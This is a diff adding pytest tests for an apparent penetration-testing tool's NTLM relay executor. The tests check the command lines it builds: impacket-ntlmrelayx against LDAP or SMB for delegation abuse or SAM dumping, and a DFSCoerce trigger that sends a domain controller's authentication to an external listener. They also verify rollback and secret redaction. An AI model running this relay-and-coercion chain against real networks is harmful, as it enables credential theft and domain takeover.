@@ -691,3 +691,89 @@ def test_relay_rbcd_observed_after_failed_trigger_still_rolls_back(tmp_path):
     _assert_relay_outcome(receipt, "coerce_not_fired")
     assert receipt["mutation"]["applied"] is True
     assert receipt["mutation"]["rollback"]["verified"] is True
+
+
+# ============================================================ Relay external listener
+@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
+@pytest.mark.parametrize("endpoint", ["10.0.0.250", "10.0.0.250:1445"])
+def test_relay_external_listener_dispatch_and_preview(tmp_path, mode, endpoint):
+    import shlex
+    pm = _FakePM(reads=["Delegation rights modified successfully!"])
+    runner = _relay_runner()
+    ctx = _ctx(_cfg(), runner, tmp_path, pm)
+    executor = get_executor("NTLM-RELAY")
+    overrides = {"mode": mode, "external_listener": endpoint,
+                 "listener_host": "ignored", "victim_dc": "dc02", "method": "dfscoerce"}
+    plan = executor.plan(ctx, _relay_finding(), overrides)
+    argv = shlex.split(plan.steps_preview[0].split(": ", 1)[1])
+    assert argv[:3] == ["impacket-ntlmrelayx", "-t",
+                        ("ldap://" if mode == "ldap_rbcd" else "smb://") + _relay_finding().host]
+    assert "-smb2support" in argv and "--no-http-server" in argv
+    if mode == "ldap_rbcd":
+        assert "--delegate-access" in argv and "-l" not in argv
+    else:
+        assert argv[argv.index("-l") + 1] == str(tmp_path / "loot")
+    if ":" in endpoint:
+        assert argv[argv.index("--smb-port") + 1] == "1445"
+    else:
+        assert "--smb-port" not in argv
+    assert "coercer coerce" in plan.steps_preview[1]
+    assert f"-l {endpoint} -t dc02" in plan.steps_preview[1]
+    assert _cfg().password not in " ".join(plan.steps_preview)
+
+    receipt = executor.run(ctx, _relay_finding(), overrides)
+    _assert_relay_outcome(receipt, "coercion_dispatched_external")
+    assert receipt["terminal_fact"]["kind"] == (
+        "rbcd_access" if mode == "ldap_rbcd" else "replication_dump")
+    assert endpoint in receipt["terminal_fact"]["predicate"]
+    assert "operator's ntlmrelayx" in receipt["terminal_fact"]["predicate"]
+    assert {s["name"] for s in receipt["steps"]} == {"external_listener", "coerce_trigger"}
+    assert all(s["ok"] for s in receipt["steps"])
+    assert pm.started == pm.stopped == [] and pm._ri == 0
+    trigger, = runner.calls
+    assert trigger[trigger.index("-l") + 1] == endpoint
+    assert trigger[trigger.index("-t") + 1] == "dc02"
+    assert trigger[trigger.index("--filter-method-name") + 1] == "NetrDfsRemoveStdRoot"
+    assert receipt["mutation"]["applied"] is False
+    assert receipt["mutation"]["rollback"]["performed"] is False
+
+
+@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
+@pytest.mark.parametrize("trigger", [RunResult(None, timed_out=True), RunResult(None, error="absent")])
+def test_relay_external_listener_trigger_not_fired(tmp_path, mode, trigger):
+    pm = _FakePM()
+    receipt = get_executor("NTLM-RELAY").run(
+        _ctx(_cfg(), _relay_runner(trigger), tmp_path, pm), _relay_finding(),
+        overrides={"mode": mode, "external_listener": "10.0.0.250"})
+    _assert_relay_outcome(receipt, "coerce_not_fired")
+    assert pm.started == pm.stopped == []
+
+
+@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
+def test_relay_empty_external_listener_preserves_r1(tmp_path, mode):
+    pm = _FakePM(reads=["Authenticating against smb://srv02 as NORTH/DC01$ SUCCEED"])
+    receipt = get_executor("NTLM-RELAY").run(
+        _ctx(_cfg(tool_timeout_s=0), _relay_runner(), tmp_path, pm), _relay_finding(),
+        overrides={"mode": mode, "external_listener": ""})
+    _assert_relay_outcome(receipt, "action_denied")
+    assert len(pm.started) == 1 and pm.stopped == ["h1"]
+
+
+@pytest.mark.parametrize("mode", ["smb_sam", "ldap_rbcd"])
+@pytest.mark.parametrize("fired", [True, False])
+def test_relay_external_secret_guard(tmp_path, mode, fired):
+    tokens = []
+    for payload in ("externalSecretOne deadbeef", "externalSecretTwo cafebabe"):
+        pm = _FakePM(reads=[payload])
+        trigger = RunResult(1, stdout=payload, stderr=payload,
+                            error=None if fired else payload)
+        receipt = get_executor("NTLM-RELAY").run(
+            _ctx(_cfg(), _relay_runner(trigger), tmp_path, pm), _relay_finding(),
+            overrides={"mode": mode, "external_listener": "10.0.0.250"})
+        _assert_relay_outcome(receipt, "coercion_dispatched_external" if fired else "coerce_not_fired")
+        blob = json.dumps(receipt)
+        assert all(secret not in blob for secret in payload.split())
+        assert _cfg().password not in blob
+        tokens.append(receipt["terminal_fact"]["proof_token"])
+        assert pm.started == pm.stopped == []
+    assert tokens[0] == tokens[1]
